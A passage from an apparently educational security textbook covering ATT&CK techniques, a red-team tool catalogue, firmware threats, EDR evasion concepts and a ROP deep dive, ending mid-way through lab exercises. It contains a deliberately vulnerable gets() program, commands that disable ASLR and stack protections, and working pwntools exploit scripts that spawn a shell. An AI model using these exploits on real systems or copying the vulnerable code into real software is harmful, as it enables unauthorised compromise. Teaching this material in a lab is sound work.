- **T1082 System Information Discovery**
- **T1018 Remote System Discovery**
- **T1071.001 Application Layer Protocol: Web Protocols** — HTTPS C2
- **T1071.004 Application Layer Protocol: DNS** — DNS C2
- **T1572 Protocol Tunneling**
- **T1090 Proxy** — pivoting
- **T1041 Exfiltration Over C2 Channel**
- **T1567.002 Exfiltration Over Web Service: Cloud Storage**
- **T1190 Exploit Public-Facing Application**
- **T1068 Exploitation for Privilege Escalation**
- **T1212 Exploitation for Credential Access**
- **T1211 Exploitation for Defense Evasion**

### 4. ATT&CK For Containers

ATT&CK has a dedicated [Containers matrix](https://attack.mitre.org/matrices/enterprise/containers/). Key techniques:

- **T1610 Deploy Container** — see Part 39.3
- **T1611 Escape to Host** — see Part 38
- **T1613 Container and Resource Discovery**
- **T1612 Build Image on Host**
- **T1525 Implant Internal Image** — registry persistence
- **T1609 Container Administration Command** — `kubectl exec`-style abuse
- **T1552.007 Unsecured Credentials: Container API**

### 5. ATT&CK For Cloud

The [Cloud matrix](https://attack.mitre.org/matrices/enterprise/cloud/) has its own techniques. Particularly relevant:

- **T1078.004 Valid Accounts: Cloud Accounts**
- **T1098.001 Account Manipulation: Additional Cloud Credentials**
- **T1538 Cloud Service Dashboard**
- **T1526 Cloud Service Discovery**
- **T1580 Cloud Infrastructure Discovery**
- **T1537 Transfer Data to Cloud Account**

### 6. Using ATT&CK Operationally

Practical ways teams use ATT&CK:

- **detection coverage maps**: which techniques can your SIEM/EDR see today? which are blind spots?
- **threat-informed defense**: pick a known adversary group (APT*), look up their TTPs, prioritize detections covering their techniques
- **purple-team exercises**: red team executes a labeled set of techniques; blue team confirms each one fired a detection
- **SOAR playbooks**: each technique ID has an associated response runbook
- **Sigma rules** carry ATT&CK technique IDs as metadata

### 7. Tools That Speak ATT&CK

- **MITRE Caldera** — adversary emulation framework with ATT&CK-tagged abilities
- **Atomic Red Team** — small, technique-by-technique tests in scripts
- **Metta** (Uber) — older but technique-aligned
- **DeTT&CT** — visualize coverage
- **VECTR** — track purple-team exercise results

### 8. The Honest Caveat

ATT&CK is a *map*, not a *theory*. It catalogs what attackers have *been observed* doing. New techniques (especially in eBPF rootkits, AI-assisted recon, and supply chain) appear faster than ATT&CK updates. Treat the matrix as a starting point, not a complete picture.

## Part 45: Red-Team Tool Catalog

**Level: All levels (reference).** A categorized list of tools you will see in writeups, blog posts, and engagement reports. Knowing the *names* and what they *do* is the goal — not how to use each one.

This list is intentionally not exhaustive. It is the names a working red teamer recognizes.

### 1. Reconnaissance

- **nmap** — network scanner; still the canonical tool
- **masscan**, **rustscan**, **naabu** — fast port scanners
- **httpx**, **httprobe** — HTTP probing at scale
- **subfinder**, **amass**, **assetfinder** — subdomain enumeration
- **dnsx**, **dnsrecon** — DNS recon
- **shodan-cli**, **censys-cli** — internet-scale recon
- **gowitness**, **eyewitness** — screenshot many web targets

### 2. Web Application

- **Burp Suite** (Pro and Community) — web proxy and testing platform
- **OWASP ZAP** — open-source web proxy
- **caido** — modern Burp alternative
- **ffuf**, **wfuzz**, **gobuster**, **dirsearch** — web fuzzing and content discovery
- **sqlmap** — SQL injection automation
- **nuclei** — template-driven vulnerability scanner
- **xxeinjector**, **xsstrike**, **commix** — single-purpose web exploiters

### 3. Linux Privilege Escalation Enumeration

- **PEASS-ng / linpeas.sh** — comprehensive enumeration
- **LinEnum** — older, still useful
- **linux-exploit-suggester / linux-exploit-suggester-2** — kernel CVE matching
- **GTFOBins** (web reference) — abuse paths for individual binaries
- **pspy** — process snooping without root
- **mimipenguin**, **LaZagne** — credential extraction

### 4. Exploitation Frameworks

- **Metasploit Framework** — the original; large module library
- **Sliver** (BishopFox) — modern Go-based C2
- **Mythic** — modular C2 with multiple agents
- **Empire** / **Starkiller** — older; PowerShell-focused but Linux agents exist

### 5. Tunneling And Pivoting

- **chisel** — TCP/UDP over HTTP, single binary
- **ligolo-ng** — TUN-based pivoting
- **frp**, **gost** — reverse proxies
- **socat**, **nc**, **ssh** — built-ins that handle most cases
- **iodine** — DNS tunnel
- **stunnel** — TLS wrapping

### 6. Container And Kubernetes

- **kube-hunter** — K8s exposure scanner
- **kubeaudit**, **kube-bench**, **kubesec**, **kube-linter** — config audits
- **rakkess**, **kubectl-who-can**, **rbac-lookup** — RBAC analysis
- **Peirates** — K8s post-exploitation
- **Bad Pods** (BishopFox) — dangerous-pod catalog
- **Falco**, **Tetragon**, **KubeArmor**, **Tracee** — defenders worth understanding

### 7. Cloud

- **Pacu** (AWS) — exploitation framework
- **PMapper** (AWS) — IAM graph
- **ScoutSuite**, **Prowler**, **CloudSploit**, **Nuvola** — multi-cloud audit
- **gcp_enum**, **GCPBucketBrute** (GCP)
- **MicroBurst**, **Stormspotter** (Azure)
- **CloudFox** (Bishop Fox) — multi-cloud post-ex

### 8. Reverse Engineering

- **Ghidra** — full RE workstation, free, NSA-released
- **radare2** / **rizin** / **Cutter** — open RE stack
- **Binary Ninja**, **IDA** — commercial
- **angr** — binary analysis framework
- **objdump**, **readelf**, **nm**, **strings** — basic ELF tools

### 9. Exploitation Workbench

- **gdb** plus **pwndbg** or **gef** — interactive debugger
- **pwntools** (Python) — exploit scripting
- **ROPgadget**, **ropper** — gadget search
- **one_gadget** — libc one-shot finder
- **checksec** — mitigation report
- **patchelf** — ELF rewriting for lab work

### 10. Fuzzing

- **AFL++** — general-purpose
- **libFuzzer** — in-process
- **honggfuzz** — feedback-rich
- **syzkaller** — kernel
- **kAFL / Nyx** — kernel via hypervisor

### 11. Forensics And Detection (Cross-Functional)

Useful even for red teamers because they tell you what you are leaving behind:

- **strace**, **ltrace**, **sysdig** — syscall and call tracing
- **bpftrace**, **bcc-tools**, **bpftool** — eBPF investigation
- **volatility3** — memory forensics
- **YARA** — pattern matching
- **Sigma** — rule format for SIEM-portable detections
- **OSQuery**, **fleet** — SQL over endpoint state
- **Velociraptor**, **GRR** — endpoint live forensics
- **CyberChef** — interactive data transformation

### 12. The Tool Discipline

A short rant that belongs here: tools are not the skill. The skill is reading the system. A lot of red teamers collect tools the way fishermen collect lures, and most of the lures stay in the box. Build fluency with a small set:

- one network scanner (`nmap`)
- one privesc enumerator (`linpeas`)
- one C2 (`Sliver` or `Mythic`)
- one tunnel (`chisel` or `ligolo-ng`)
- one debugger setup (`gdb` + `pwndbg`)
- one fuzzer (`AFL++`)
- one RE platform (`Ghidra`)

Then add tools as the engagement actually requires them.

## Part 46: Hardware And Firmware Threat Surface

**Level: Advanced.** A short Part. The kernel does not run on bare wood — it runs on firmware that may itself be vulnerable, and on hardware that has its own attack surfaces.

### 1. Why This Matters

Mature red teams and mature defenders both look below the kernel. Reasons:

- **persistence below the OS** survives reinstalls
- **DMA** (Direct Memory Access) bypasses CPU permission checks
- **firmware** is often unsigned, unverified, and not in the patching workflow
- **management controllers** (BMC/IPMI/iLO/iDRAC) run their own networked OS that nobody audits

### 2. The Boot Trust Chain

In rough order:

```text
hardware reset
  -> CPU reset vector
  -> SoC ROM / Boot ROM (immutable)
  -> firmware (UEFI / coreboot / U-Boot)
  -> bootloader (GRUB / systemd-boot)
  -> kernel + initramfs
  -> userspace
```

Each link signs (or should sign) the next. *Secure Boot* enforces this for the UEFI -> bootloader -> kernel chain. *Measured Boot* records hashes into a TPM so a remote verifier can attest the chain.

If any link is compromised, every later link is untrusted regardless of what the OS thinks.

### 3. UEFI And Coreboot

UEFI is a small operating system in itself, with its own filesystem (ESP), its own drivers, and its own apps. The risks:

- **firmware implants**: software-installable rootkits in UEFI (LoJax, MosaicRegressor, BlackLotus). Survive OS reinstall.
- **vulnerable UEFI drivers** (DXE phase) reachable from the OS via runtime services
- **misconfigured Secure Boot** (disabled, or with attacker-added DB keys)
- **MoonBounce, ESPecter** — other named families

Coreboot replaces parts of UEFI with open-source firmware on supported hardware; it does not by itself fix the supply-chain problem.

Defensive tools and concepts:

- **CHIPSEC** — Intel's open-source platform-security analyzer
- **fwupd / LVFS** — coordinated firmware update infrastructure for Linux
- **Heads** — minimal coreboot+Linux firmware focused on attestation
- **Platform Firmware Resilience** (NIST SP 800-193) — the framework

### 4. TPM And Attestation

A TPM (Trusted Platform Module) is a small chip (or firmware equivalent) that:

- holds keys that never leave it
- maintains PCRs (Platform Configuration Registers) that record boot measurements
- can sign attestations of those PCRs

Practical uses:

- **disk encryption** keys sealed to a known PCR state (LUKS+TPM): the disk only unlocks if boot is unchanged
- **remote attestation** of kernel and userspace integrity
- **measured boot** with IMA extending into userspace files

For red team: TPM-bound disks are unreadable if you take them out of the host. For blue team: PCR-sealed secrets resist many post-exploitation attempts.

### 5. BMC / IPMI / Lights-Out Management

Servers often have a separate management controller — iLO (HP), iDRAC (Dell), IPMI in general. It runs its own embedded OS (often a tiny Linux), has its own network interface, and can power-cycle, console, and remount the host.

Why this matters:

- BMCs are reachable over the network long after the OS is shut down
- BMC firmware is often years out of date
- BMC compromise is full host compromise: mount any ISO, boot from it
- IPMI 2.0 had famous credential-disclosure vulnerabilities

In an engagement, BMC interfaces in scope are very high value. In a defense plan, BMCs need their own segmented management network and a real patching schedule.

### 6. DMA Attacks

Hardware that can do DMA bypasses the CPU's permission system entirely. It can read or write any physical memory, including kernel memory, without asking the OS.

Classes of DMA attacker:

- **physical access via Thunderbolt / PCIe**: a device plugged in can DMA the host (laptop attacks like PCILeech)
- **rogue PCIe cards** in datacenters
- **DMA from a compromised device firmware** (NIC, GPU, SSD controller)

Defenses:

- **IOMMU / VT-d / AMD-Vi** — restrict DMA per device
- **kernel `iommu=force`** — enable the IOMMU early
- **Thunderbolt security level** — require user authorization for new devices
- **disable unused buses** in BIOS

### 7. Side-Channels

A separate but related family: information leaks via timing, cache, branch prediction, or shared-resource contention.

Names worth recognizing:

- **Spectre** (v1, v2, v4, ...) and **Meltdown** — speculative-execution side channels
- **L1TF, MDS, ZombieLoad, RIDL, Fallout** — microarchitectural data sampling
- **Rowhammer** — flipping DRAM bits by repeated access; not a side channel exactly, but a hardware attack
- **PortSmash, TLBleed, PortContention** — execution-port and TLB side channels

These are why you see kernel mitigations like KPTI, retpoline, IBPB, IBRS, eIBRS in `dmesg` and `/sys/devices/system/cpu/vulnerabilities/`.

### 8. Embedded And IoT

If the engagement scope includes embedded Linux (routers, IP cameras, industrial controllers, vehicle ECUs), the threat model shifts:

- often no Secure Boot
- often a single root password baked into firmware
- often `telnet` or unauthenticated UART exposed
- often outdated kernel and busybox versions

Tools to know: **binwalk** (firmware extraction), **firmware-mod-kit**, **EMBA** (firmware analysis pipeline), **JTAGulator** for hardware probing, **OpenOCD**, **Bus Pirate**.

### 9. The Pragmatic Posture

Most engagements do not need to go below the kernel. But knowing this layer exists is what separates a serious practitioner from someone who only reads writeups. When something on the host stops making sense — when a clean reinstall does not remove the compromise, when the disk has data that does not match what the OS believes — this Part is where the answer lives.

## Part 47: Anti-Detection And EDR Evasion (Concepts)

**Level: Advanced.** A defensive-framing chapter on how detectors are evaded, written so blue teams can harden their detection stack rather than so red teams can copy techniques.

**Beginner sidebar.** *EDR* (Endpoint Detection and Response) is a class of agent that watches a host for malicious activity. On Linux, EDR is increasingly built on eBPF. Understanding how detection works tells both sides where the weak spots are.

### 1. Why Talk About Evasion At All

If a red-team engagement never gets caught, it failed as a defensive exercise — the defenders learned nothing. The point is to *characterize* detection coverage. To do that, you need to understand which techniques produce signal and which slip through. This Part is that map.

### 2. The Detection Surface On Linux

A modern Linux EDR sees roughly:

- **syscalls** (via eBPF tracepoints, audit, or LSM hooks)
- **process tree events** (fork, exec, exit)
- **network events** (`tcp_connect`, `udp_sendmsg`, etc.)
- **file events** (`openat`, `unlinkat`, `rename`, `mount`)
- **module and BPF program loads**
- **credential transitions** (UID, GID, capability changes)
- **container metadata** for each event
- **disk integrity** via FIM and YARA scans
- **logs** from `journald`, application logs, web logs (the Part 18 stack)

Evasion is the art of producing as few of these as possible while still doing useful work.

### 3. Common Evasion Concepts (Defensive Framing)

For each, the question to ask as a defender is "do we still detect this?"

- **Living off the land**: use `bash`, `python3`, `curl` instead of dropping a custom tool. Detected by behavior pattern, not file signature.
- **In-memory execution**: load and run from `memfd_create`, never touch disk. Detected by `execveat` from anonymous fd, by `/proc/<pid>/maps` showing `memfd:` regions, by absence of an on-disk binary backing the running process.
- **Process renaming / `prctl(PR_SET_NAME)`**: hide the command name. Detected by mismatch between `comm` and `cmdline`/`/proc/<pid>/exe`.
- **Sleep masking and traffic shaping**: change beacon timing to avoid pattern detection. Detected by long-tail traffic analysis at scale.
- **Direct syscall**: skip libc and call syscalls directly to evade userland hooks. Less effective on Linux than Windows because eBPF hooks at the kernel boundary.
- **eBPF-based anti-detection**: use eBPF to lie to other eBPF programs. Defeated by BPF LSM denying unsigned BPF, by `bpftool prog list` audits, by kernel lockdown.
- **Process injection via ptrace**: hide inside an existing process. Detected by `ptrace` events, defeated by `kernel.yama.ptrace_scope=2`.
- **Anti-VM / anti-sandbox**: refuse to run inside obvious analysis environments. Detected by deliberately producing non-suspicious sandboxes that look like real hosts.
- **Time-based and trigger-based execution**: only run when conditions are met (specific date, specific user logged in). Detected by behavior at the trigger time, hard to detect at install time.
- **Polymorphism / packing**: changes the binary's bytes to defeat signature matching. Defeated by behavior-based detection.

### 4. Detection Hardening That Actually Works

A pragmatic list, drawn from the techniques above:

- **eBPF-based runtime telemetry** that captures the events listed in Part 47.2, properly correlated (Part 16's Cornela design)
- **BPF LSM enforcement** to deny new BPF programs, deny unexpected mounts, deny unexpected execs
- **strict kernel hardening sysctls** (Part 29.10)
- **centralized logging with retention and alerting** so log gaps are themselves alarms
- **drift detection on system state** (Part 18) — catches the artifacts evasion cannot avoid
- **periodic forensic comparison** of `/proc/kallsyms`, BPF programs, modules, and known-good baselines
- **outbound network policy** so the C2 channel itself is blocked
- **least-privilege everywhere** — capability minimization, no privileged containers, no host mounts, user namespaces, seccomp default profiles

### 5. The Asymmetry

A serious adversary with a 0-day, infinite time, and a willingness to burn capability can usually evade. Most adversaries are not that. Most engagements involve operators who are competent but time-constrained, using tools that produce known signal patterns.

Detection wins on *most* attackers if the basics are in place. The basics are not exotic: they are the layered observability and hardening this book has been describing the entire time.

### 6. The Final Honest Note

If you reach this Part with a working understanding of every prior Part, you are no longer a beginner. You can read CVEs, you can read kernel patches, you can read eBPF code, you can read engagement reports, and you can connect them. The remaining gap is practice and time.

The defensive industry has more open seats than qualified practitioners. The single most useful thing you can do with the material in this book is *use it* — on a lab, on a CTF, on a writeup, on a real production system you support. The book ends here. The work starts.

## Part 48: ROP And Code-Reuse Attacks (Deep Dive)

**Level: Advanced.** This Part expands on Part 28.6, which only sketched ROP in a single bullet. ROP is the most important technique in modern userspace exploitation and a recurring concept in kernel exploitation, so it deserves its own chapter. Read Part 28 first.

**Beginner sidebar.** ROP — *Return Oriented Programming* — is the technique that defeated NX/DEP. Instead of injecting new code (which NX blocks), the attacker reuses tiny pieces of code that already exist in the program or its libraries, stitching them together with the stack to do whatever they want. Understanding ROP is the difference between reading exploit writeups and not.

### 1. Why ROP Exists

The historical chain of mitigations and bypasses:

```text
stack overflow + shellcode on the stack
  -> NX makes the stack non-executable
       -> ret2libc: return into libc functions
            -> ASLR randomizes libc addresses
                 -> info leak + ret2libc
                      -> stack canaries break naive linear overwrite
                           -> ROP: chain many gadgets, no injected code
                                -> CFI / shadow stacks restrict ROP
                                     -> JOP, COP, SROP, BROP, data-only
```

ROP was the answer to "we cannot put new code anywhere; we can only redirect execution." The insight is that you do not *need* new code — the existing code (libc, the binary itself, every loaded library) already contains every instruction you could want, in tiny pieces. Stitching those pieces together gives you arbitrary computation.

This insight is from Hovav Shacham's 2007 paper, *The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)*. It remains required reading.

### 2. What A Gadget Is

A *gadget* is a short sequence of instructions ending in a `ret` (or `jmp`/`call` for variants). Examples:

```text
pop rdi ; ret
pop rsi ; pop r15 ; ret
mov rax, [rdi] ; ret
xchg rsp, rax ; ret
syscall ; ret
```

Each gadget does one tiny job. Chained, they compute. The `ret` at the end pops the next address from the stack and jumps to it — so the *stack itself becomes the program*, and each chain entry says "now do this small thing, then return for the next instruction."

A startling observation that makes ROP work: x86 is a variable-length instruction set. A `ret` byte (`0xc3`) appears inside *unintended* instruction sequences when you start decoding from the wrong offset. So a small library has thousands of latent gadgets that the original programmer never wrote.

### 3. The Mental Model: The Stack As A Tape

Think of an in-progress ROP chain like this:

```text
rsp -> [ addr of "pop rdi ; ret" ]   <- next gadget to execute
       [ value to load into rdi  ]
       [ addr of "pop rsi ; ret" ]
       [ value to load into rsi  ]
       [ addr of system           ]
       [ "fake return address"    ]
       ...
```

When the vulnerable function returns, `ret` pops the first gadget address and jumps. That gadget executes `pop rdi ; ret`, which pops the next stack value (the value for `rdi`) and then `ret`s again, consuming the next gadget. The stack pointer marches forward through the chain.

In simple terms: **`ret` is a `goto` whose target is "the next thing on the stack."** A chain is a list of those targets, interleaved with the values they consume.

### 4. Common Gadget Patterns

You will see the same handful of gadgets in nearly every chain:

- **Argument-loading**: `pop rdi ; ret`, `pop rsi ; ret`, `pop rdx ; ret`, `pop rcx ; ret` (System V calling convention)
- **Memory write**: `mov [rdi], rsi ; ret` or `mov qword ptr [rax], rcx ; ret`
- **Memory read**: `mov rax, [rdi] ; ret`
- **Arithmetic**: `add rdi, rax ; ret`, `xor rax, rax ; ret`
- **Stack pivot**: `xchg rsp, rax ; ret`, `leave ; ret`, `add rsp, 0x100 ; ret`
- **Syscall**: `syscall ; ret`
- **Indirect call sink**: `call rax`, `jmp rax`, `call qword ptr [rax+0x10]` for JOP/COP

A useful drill: pick a libc and find each of these. After a few hours you start to recognize the pattern at a glance.

### 5. Finding Gadgets

Tools to scan a binary or library for usable gadgets:

- **ROPgadget** — classic, fast, supports x86, ARM, MIPS, PowerPC
- **ropper** — Python tool, more flexible filters and search
- **rp++** — high performance, unique-only, good for big binaries
- **angrop** — symbolic, finds gadgets that satisfy a constraint (e.g., "load `rdi=0x...` and call")
- **one_gadget** — a different category: finds *single libc addresses* where calling them spawns a shell, given specific register/stack constraints. Sometimes one address replaces a whole chain.

Typical workflow:

```bash
ROPgadget --binary ./target | grep "pop rdi ; ret"
ropper --file libc.so.6 --search "pop rdi"
one_gadget libc.so.6
```

### 6. ret2libc Versus ret2syscall Versus Pure ROP

Different chain styles, picked by what is in scope:

- **ret2libc**: redirect to a libc function like `system("/bin/sh")`. Short. Needs `rdi = "/bin/sh"`. Defeated alone by canaries, ASLR (without leak), and seccomp filters that block `execve`.
- **ret2syscall**: build the syscall directly (`rax=59` for `execve`, `rdi="/bin/sh"`, `rsi=0`, `rdx=0`, then `syscall`). Bypasses libc-resolution issues but needs every register loaded.
- **Pure ROP**: do arbitrary computation in gadgets, only invoking libc when absolutely necessary. Verbose but flexible.

Which one you pick depends on what gadgets are available, whether libc is mapped, and what the runtime restricts.

### 7. The Leak Step

Modern targets have ASLR and PIE, so addresses are randomized. Before any useful chain, the operator usually needs a *leak* — some way to read a known kernel/libc address out of the running process.

Common leak primitives:

- **format-string** with `%p` (Part 28.9)
- **GOT read** via `puts(got["puts"])` — call `puts` with the address of a known GOT entry; it prints the resolved libc address
- **stack leak** via `printf("%s", &stack)` when the stack contains saved libc addresses
- **info-disclosure bug** in the same target

Once you have one libc address, you compute the libc base by subtracting the known offset of that symbol, and the rest of libc becomes addressable.

A typical exploit then looks like:

```text
phase 1 (leak):  small chain that calls puts(got_puts), prints address, loops back
                 to a known re-entry point so the same vulnerability fires again
phase 2 (pwn):   bigger chain, now using libc-base-derived addresses, calls system or
                 builds an execve syscall
```

### 8. Stack Pivoting

Sometimes the buffer overflow only gives you a few bytes of overwrite — not enough room for a real chain. Solution: *pivot* the stack pointer to a memory region you control.

Common pivots:

- **`xchg rsp, rax ; ret`** when `rax` already points to attacker-controlled memory
- **`leave ; ret`**, which sets `rsp = rbp ; pop rbp ; ret` — useful if you control `rbp`
- **`add rsp, <const> ; ret`** to skip into your fake stack

After the pivot, `rsp` lives in attacker-controlled memory (heap, BSS, environment, an mmap'd region), and the chain runs from there.

### 9. ret2plt And ret2dlresolve

Two techniques that are useful when the binary has no libc leak yet but does have a PLT.

- **ret2plt**: call a libc function through its PLT entry, using the `got.plt` indirection to invoke the real function. Effectively "I do not know where libc is, but I know where the PLT is" (the PLT is in the binary, not subject to libc ASLR).
- **ret2dlresolve**: abuse the dynamic linker's lazy resolution. Forge a fake `Elf_Sym` and `Elf_Rel` entry on the stack and point the resolver at them, getting it to resolve an arbitrary libc symbol for you and call it. Works when full RELRO is not enabled.

These are workhorse techniques in mid-difficulty CTF challenges and worth studying once.

### 10. ret2csu

A useful trick when gadgets are scarce. The function `__libc_csu_init` (linked into nearly every dynamically linked binary) ends with a tail of `pop r15 ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret` and earlier loads `rdi, rsi, rdx` from those very registers via `mov` instructions. Two carefully crafted stack frames over `__libc_csu_init` give you control of `rdi/rsi/rdx` and a controlled call. This was a standard pwn-CTF answer for years.

Modern toolchains (with `-fno-asynchronous-unwind-tables` or after newer compiler changes) sometimes lack the convenient pattern. When it is present, it is gold.

### 11. SROP — Sigreturn Oriented Programming

A 2014 result by Bosman and Bos. Linux's `sigreturn` syscall restores the entire register state from a *sigframe* that the kernel laid out on the stack when a signal fired. If the attacker can put a fake sigframe on the stack and trigger `sigreturn`, every register is set in one shot.

Practically:

- one gadget: `mov rax, 0xf ; syscall` (sigreturn is syscall 15) — or directly find a `syscall ; ret` and set `rax=15` first
- attacker-built sigframe on the stack provides values for every register
- after `sigreturn` executes, the program continues from attacker-chosen state

Why it matters:

- only one gadget needed
- bypasses ASLR if the operator already has a small leak
- the sigframe layout is stable across kernel versions, so it transfers between targets
- works on architectures where ROP gadgets are scarce (some embedded MIPS, ARM)

### 12. JOP And COP

When CFI or shadow stacks specifically restrict `ret`, attackers move to:

- **JOP (Jump Oriented Programming)**: gadgets ending in `jmp <reg>` instead of `ret`. The attacker controls the register and uses a *dispatcher* gadget that loops over a list of gadget addresses.
- **COP (Call Oriented Programming)**: gadgets ending in `call <reg>`, similar setup.

These are messier than ROP — you need a dispatcher and a more controlled register state — but they survive specific anti-ROP defenses.

### 13. BROP — Blind ROP

Bittau et al., 2014. The threat model: the attacker has a buffer overflow but no copy of the binary. Cannot find gadgets statically.

The technique:

- the target server *forks per connection*, so a crash does not kill the master
- the attacker repeatedly probes addresses; addresses that crash differ from those that do not
- by carefully chosen probes, the attacker discovers `ret`, `pop` gadgets, the location of `write`, and finally a working chain — all without ever having the binary

BROP is a reminder that auto-restart on crash is a security property: it gives the attacker an oracle.

### 14. Stack Pivot Plus Heap Combined

In modern challenges, stack space is tight. A common pattern:

1. heap bug puts a fully assembled ROP chain into a heap chunk
2. stack pivot redirects `rsp` into that heap chunk
3. chain runs

This is one of the reasons heap exploitation (Part 28.10–12) and ROP cannot be cleanly separated. Real exploit chains weave them together.

### 15. Modern Anti-ROP Mitigations

ROP works because every `ret` blindly pops from the stack. Mitigations attack that assumption:

- **Stack canaries** (Part 28.7) — break naive linear overwrites that overwrite the saved return address.
- **PIE + ASLR** (Part 28.8) — gadgets exist, but you cannot address them without a leak.
- **Full RELRO** (Part 28.8) — closes the GOT, removes ret2plt-style writes.
- **Intel CET — Shadow Stack (SHSTK)**: the CPU keeps a second, hardware-protected copy of return addresses. Every `ret` checks the regular stack against the shadow. Mismatch → fault. Defeats classical ROP entirely on supporting hardware (Tiger Lake and later, plus kernel + libc support).
- **Intel CET — Indirect Branch Tracking (IBT)**: every indirect call/jump must land on an `endbr64` instruction. Defeats classical JOP/COP because random gadget entries are not `endbr`-marked.
- **ARM Pointer Authentication (PAC)**: pointers are signed with a key in the upper bits; tampering with the pointer breaks the signature. ARMv8.3+. iOS deploys this aggressively.
- **ARM BTI (Branch Target Identification)**: ARM's analogue to IBT.
- **Clang CFI / LLVM CFI / kCFI**: control-flow integrity at compile time. Indirect calls must target functions whose type signature matches. Greatly shrinks the JOP/COP surface.
- **FineIBT**: lightweight CFI that combines IBT with a check that the called function's signature matches.
- **Linux kernel `CONFIG_X86_KERNEL_IBT`** and `CONFIG_X86_SHADOW_STACK` (when enabled in user binaries via `glibc 2.39+`).

In practice on modern x86_64 Linux, you should expect:

- userspace: PIE, full RELRO, canaries, NX, partial CET adoption (more in 2025+)
- kernel: KASLR, KPTI, SMEP/SMAP, kCFI on Clang-built distros, no shadow stack yet

### 16. Kernel ROP

Kernel ROP works the same way conceptually, but the gadget pool and constraints differ:

- gadgets come from the kernel image and loaded modules
- KASLR means you need a kernel info leak first
- SMEP prevents the chain from jumping into user code; SMAP prevents reading user buffers without `stac`
- the shadow stack does not yet protect the kernel on Linux, so kernel ROP remains viable
- but **data-only kernel exploitation** (Part 29.1) often beats ROP: a single arbitrary write to `cred` is shorter, more reliable, and bypasses CFI entirely

For this reason, modern kernel exploit chains often use a small kernel-ROP chain just to *enable* a data-only primitive (e.g., disable SMAP, then write to `cred`), rather than performing the entire privilege escalation in ROP.

### 17. Tools Worth Practicing With

- **gdb + pwndbg** or **gdb + gef** — runtime debugging with exploit-friendly views (`telescope`, `ropper`, `checksec` integrations)
- **pwntools** — Python framework with a `ROP` object that builds chains from a binary's gadgets
- **ROPgadget**, **ropper**, **rp++** — gadget search
- **angrop** — constraint-driven gadget search using angr's symbolic engine
- **one_gadget** — single-call wins
- **GEF's `ropper` integration** — interactive gadget search inside the debugger
- **how2heap** (Shellphish) for heap+ROP combinations

A typical pwntools chain build looks like:

```python
from pwn import *

elf  = ELF("./target")
libc = ELF("./libc.so.6")

rop = ROP(elf)
rop.puts(elf.got["puts"])     # leak
rop.call(elf.symbols["main"]) # restart for phase 2

payload = b"A"*offset + rop.chain()
```

That is the end-to-end shape of a phase-1 leak chain in five lines.

### 18. A Suggested Practice Path

If you want to actually internalize ROP rather than just read about it:

1. Solve a basic **ret2win** challenge (just overwriting the return address to a function in the binary).
2. Solve a **ret2libc** challenge with ASLR off.
3. Solve the same with ASLR on, by adding a libc leak.
4. Build a **ret2syscall** chain that does `execve("/bin/sh", 0, 0)` from gadgets only.
5. Use **`__libc_csu_init`** to control three argument registers in one chain.
6. Practice **stack pivoting** when given only 32 bytes of overflow.
7. Read and reproduce a published **SROP** challenge.
8. Read the **BROP** paper and try the technique against a forking lab server you wrote.
9. Read one **kernel ROP** writeup (xairy's Linux kernel exploitation index has good ones) and identify which gadgets the author used and why.

These exercises are the standard pwn-CTF curriculum. pwn.college, pwnable.kr, and ROP Emporium each have full series dedicated to ROP. ROP Emporium specifically is the cleanest introduction.

### 19. Why ROP Is Worth Learning Even If You Never Write An Exploit

Three reasons that justify the investment for defenders:

1. **Reading exploit writeups becomes effortless.** Almost every modern exploit writeup discusses gadgets, leaks, and chains in passing. Without the vocabulary, the writeup is impenetrable; with it, the writeup is a story.
2. **Mitigation decisions become rational.** Should you enable shadow stack? When does CFI matter? Why is full RELRO not the default everywhere? These are not arbitrary policy choices — they are direct responses to specific ROP variants. Knowing the variants is how you reason about the policy.
3. **Detection design improves.** ROP-style execution leaves runtime artifacts (atypical call/return patterns, stack pivots, gadget-density-weighted addresses). Hardware features like Intel PT make some of these observable. If you understand the technique, you can decide whether your runtime detection stack should care.

ROP is the single concept that ties together NX, ASLR, canaries, RELRO, CFI, shadow stacks, and modern hardware mitigations into one coherent story. That is why it deserved its own Part.

### 20. Hands-On PoCs

These PoCs are educational. They run against vulnerable programs you compile yourself, with mitigations explicitly disabled to make the exercise tractable. They will *not* work against modern hardened production binaries — every PoC below relies on conditions you set up in your own lab. Treat each one as a step on a ladder.

This is the same progression used by ROP Emporium, pwn.college, and standard university security curricula. Run them on a Linux VM you control (Part 0.12, Part 31.1).

Setup:

```bash
sudo apt install gcc gdb python3 python3-pip
pip3 install pwntools
# also install pwndbg or gef
```

For early exercises, disable ASLR. Re-enable it before PoC 3:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space   # off
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space # default on
```

#### 20.1 The Vulnerable Program

```c
// vuln.c — deliberately vulnerable lab target. Do not deploy.
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void win(void) {
    puts("you reached win()");
    execve("/bin/sh", NULL, NULL);
}

void vulnerable(void) {
    char buf[64];
    printf("> ");
    fflush(stdout);
    gets(buf);          // unsafe on purpose
    puts(buf);
}

int main(void) {
    setvbuf(stdout, NULL, 0, _IONBF);
    vulnerable();
    return 0;
}
```

Compile with mitigations off:

```bash
gcc -fno-stack-protector -no-pie -z norelro \
    -O0 -g vuln.c -o vuln
```

Confirm with `checksec --file=./vuln`. Expect: NX on, no canary, no PIE, no RELRO. NX stays on so you must use ROP techniques rather than stack shellcode.

#### 20.2 PoC 1 — ret2win (Plain Stack Overflow)

The simplest case: overwrite the saved return address with the address of `win`.

```python
# exploit_ret2win.py
from pwn import *

elf = ELF("./vuln")
io  = process("./vuln")

offset = 64 + 8                 # 64-byte buf + saved rbp
payload = b"A" * offset + p64(elf.symbols["win"])

io.sendlineafter(b"> ", payload)
io.interactive()
```

Walkthrough:

1. `vulnerable` returns, popping our crafted address into `rip`
2. execution jumps into `win`
3. `win` calls `execve("/bin/sh", ...)`

If `win` faults on stack alignment (System V ABI requires a 16-byte aligned stack at function entry), insert one extra `ret` gadget to consume an 8-byte slot:

```python
ret = ROP(elf).find_gadget(["ret"]).address
payload = b"A" * offset + p64(ret) + p64(elf.symbols["win"])
```

That alignment trick recurs everywhere.

#### 20.3 PoC 2 — Minimal ROP Chain (Argument Loading)

To call a function with arguments, load `rdi` from the stack first. Add a string to the program:

```c
const char message[] = "ROP works";
```

Recompile, then:

```bash
ROPgadget --binary ./vuln | grep "pop rdi ; ret"
```

```python
